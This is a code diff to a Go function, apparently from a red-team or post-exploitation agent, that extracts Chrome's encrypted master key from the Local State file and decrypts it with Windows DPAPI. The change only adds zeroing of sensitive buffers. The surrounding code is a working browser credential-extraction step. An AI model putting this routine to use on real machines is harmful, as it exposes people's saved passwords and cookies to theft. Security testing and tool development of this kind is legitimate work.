@@ -237,16 +237,19 @@ func (c *DpapiCommand) extractChromeKey() structs.CommandResult {
 			} `json:"os_crypt"`
 		}
 		if err := json.Unmarshal(data, &localState); err != nil {
+			structs.ZeroBytes(data)
 			sb.WriteString(fmt.Sprintf("[%s] Failed to parse Local State: %v\n", name, err))
 			continue
 		}
 
 		if localState.OSCrypt.EncryptedKey == "" {
+			structs.ZeroBytes(data)
 			sb.WriteString(fmt.Sprintf("[%s] No encrypted key found\n", name))
 			continue
 		}
 
 		encKey, err := base64.StdEncoding.DecodeString(localState.OSCrypt.EncryptedKey)
+		structs.ZeroBytes(data)
 		if err != nil {
 			sb.WriteString(fmt.Sprintf("[%s] Failed to decode key: %v\n", name, err))
 			continue
@@ -254,12 +257,14 @@ func (c *DpapiCommand) extractChromeKey() structs.CommandResult {
 
 		// Strip DPAPI prefix (5 bytes)
 		if len(encKey) < 5 || string(encKey[:5]) != "DPAPI" {
+			structs.ZeroBytes(encKey)
 			sb.WriteString(fmt.Sprintf("[%s] Unexpected key prefix\n", name))
 			continue
 		}
 
 		// Decrypt with DPAPI
 		plainKey, err := dpapiDecryptBlob(encKey[5:])
+		structs.ZeroBytes(encKey)
 		if err != nil {
 			sb.WriteString(fmt.Sprintf("[%s] DPAPI decryption failed: %v\n", name, err))
 			continue
